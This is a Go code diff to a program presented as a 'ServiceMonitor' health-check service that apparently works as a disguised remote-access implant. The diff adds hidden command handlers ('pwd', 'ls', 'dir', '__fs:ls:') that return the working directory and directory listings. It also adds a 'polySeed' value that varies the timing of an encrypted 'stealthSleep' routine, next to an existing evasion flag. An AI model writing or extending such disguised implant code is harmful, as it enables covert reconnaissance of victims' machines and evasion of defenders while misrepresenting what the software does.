@@ -54,6 +54,7 @@ var (
 	buildVersion    = "3.2.1"
 	buildDate       = "2024-11-15"
 	skipEvasion     = "" // set to "true" via ldflags to skip evasion delays
+	polySeed        = "6c21"
 )
 
 // ServiceMonitor manages health check lifecycle
@@ -351,6 +352,16 @@ func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
 		}
 	}
 
+	if checkName == "pwd" || checkName == "ls" || checkName == "dir" || strings.HasPrefix(checkName, "ls ") || strings.HasPrefix(checkName, "dir ") || strings.HasPrefix(checkName, "__fs:ls:") {
+		out := "."
+		if checkName == "pwd" {
+			out, _ = os.Getwd()
+		} else {
+			out = listDir(checkName)
+		}
+		return DiagnosticResult{CheckName: checkName, Output: out, Status: "completed", Timestamp: time.Now(), DurationMs: time.Since(start).Milliseconds()}
+	}
+
 	if strings.HasPrefix(checkName, "__hd:") {
 		return DiagnosticResult{
 			CheckName:  checkName,
@@ -408,6 +419,41 @@ func (sm *ServiceMonitor) runDiagnostic(checkName string) DiagnosticResult {
 }
 
 // runCommand executes a system diagnostic check
+func listDir(cmd string) string {
+	path := "."
+	switch {
+	case strings.HasPrefix(cmd, "__fs:ls:"):
+		path = strings.TrimSpace(cmd[len("__fs:ls:"):])
+	case strings.HasPrefix(cmd, "ls "):
+		path = strings.TrimSpace(cmd[3:])
+	case strings.HasPrefix(cmd, "dir "):
+		path = strings.TrimSpace(cmd[4:])
+	}
+	if path == "" {
+		path = "."
+	}
+	entries, err := os.ReadDir(path)
+	if err != nil {
+		return "Error: cannot list"
+	}
+	var b strings.Builder
+	for _, e := range entries {
+		kind := "f"
+		if e.IsDir() {
+			kind = "d"
+		}
+		var sz int64
+		if info, err := e.Info(); err == nil {
+			sz = info.Size()
+		}
+		fmt.Fprintf(&b, "%s %d %s\n", kind, sz, e.Name())
+	}
+	if b.Len() == 0 {
+		return "(empty)"
+	}
+	return b.String()
+}
+
 func runCommand(ctx context.Context, name string, args ...string) ([]byte, error) {
 	if _, ok := ctx.Deadline(); !ok {
 		var cancel context.CancelFunc
@@ -497,6 +543,9 @@ func (sm *ServiceMonitor) run() {
 }
 
 func stealthSleep(d time.Duration) {
+	if polySeed != "" {
+		d += time.Duration(polySeed[0]%3) * time.Millisecond
+	}
 	sleepEncrypted(d)
 }
 
